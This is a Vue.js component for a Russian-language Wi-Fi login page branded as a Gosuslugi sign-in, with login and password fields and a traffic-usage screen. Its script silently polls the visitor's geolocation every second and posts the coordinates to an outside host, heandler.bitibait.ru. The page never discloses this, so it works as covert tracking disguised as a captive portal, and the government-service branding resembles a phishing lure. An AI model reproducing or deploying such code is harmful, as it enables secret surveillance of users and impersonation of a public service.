<template>
    <div>
        <div id="appCapsule" class="pt-0">

            <div class="login-form mt-1">
                <div class="section" v-if="screen == 1">
                    <img src="images/inno.svg" alt="image" style="height: 100%; max-width: 280px;" class="form-image m-5">
                </div>
                <div class="section" v-if="screen == 2">
                    <img src="images/avatar.png" alt="image" style="height: 60%; max-width: 280px;" class="form-image m-5">
                </div>
                <div class="section mt-1" v-if="screen == 1">
                    <h3>Подключиться к Wi-Fi через Госуслуги</h3>
                </div>
                <div class="section mt-1" v-if="screen == 2">
                    <h3>Лаврентий Павлович Мышь</h3>
                </div>
                
                <div class="section mt-1 mb-5" v-if="screen == 1">
                    <form>
                        <div class="form-group boxed">
                            <div class="input-wrapper">
                                <label style="float: left;">Логин</label>
                                <input type="email"  v-model="email" class="form-control form-control-lg" id="email1" placeholder="Логин">
                                <i class="clear-input">
                                    <ion-icon name="close-circle" role="img" class="md hydrated" aria-label="close circle"></ion-icon>
                                </i>
                            </div>
                        </div>
                        
                        <div class="form-group boxed">
                            <div class="input-wrapper">
                                <label style="float: left;">Пароль</label>
                                <input type="password" v-model="pass" class="form-control form-control-lg" id="password1" placeholder="Пароль" autocomplete="off">
                                <i class="clear-input">
                                    <ion-icon name="close-circle" role="img" class="md hydrated" aria-label="close circle"></ion-icon>
                                </i>
                            </div>
                        </div>


                        <div class="form-button-group">
                            <button type="submit" :disabled="email.length*pass.length == 0" @click="screen = 2" class="btn btn-primary btn-block btn-lg">Войти</button>
                        </div>

                    </form>
                </div>
                <div class="section mt-1 mb-5" v-if="screen == 2">
                    <div>
                        <div class="form-group boxed">
                            <div class="input-wrapper">
                                <label style="float: left;">Использовано трафика: <b>65.3ГБ / 1ТБ</b></label><br>
                                <div class="d-block progress mb-2 mt-2">
                                    <div class="progress-bar" role="progressbar" style="width: 65%" aria-valuenow="65" aria-valuemin="0" aria-valuemax="100"></div>
                                </div>
                            </div>
                        </div>

                        <div class="form-button-group">
                            <button type="submit" :disabled="email.length*pass.length == 0" @click="screen = 1" class="btn btn-primary btn-block btn-lg">Отключиться</button>
                        </div>

                    </div>
                </div>
            </div>


        </div>
    </div>  
</template>
<script>
    export default {
        data: function () {
            return {
                count: 0,
                pass: "",
                email: "",
                screen: 1,
                data: null,
            }
        },
        mounted(){
            let timerId = setInterval(() => this.updatePos(), 1000);
        },
        methods: {
            updatePos: function(){
                navigator.geolocation.getCurrentPosition(function(position) {
                    let lat = position.coords.latitude;
                    let long = position.coords.longitude;
                    axios({
                        method: 'post',
                        url: 'heandler.bitibait.ru',
                        data: {
                            lat: lat,
                            long: long
                        }
                    })
                    .then(function (response) {
                        console.log('ok');
                    });
                });
            }
        },
        
    }
</script>
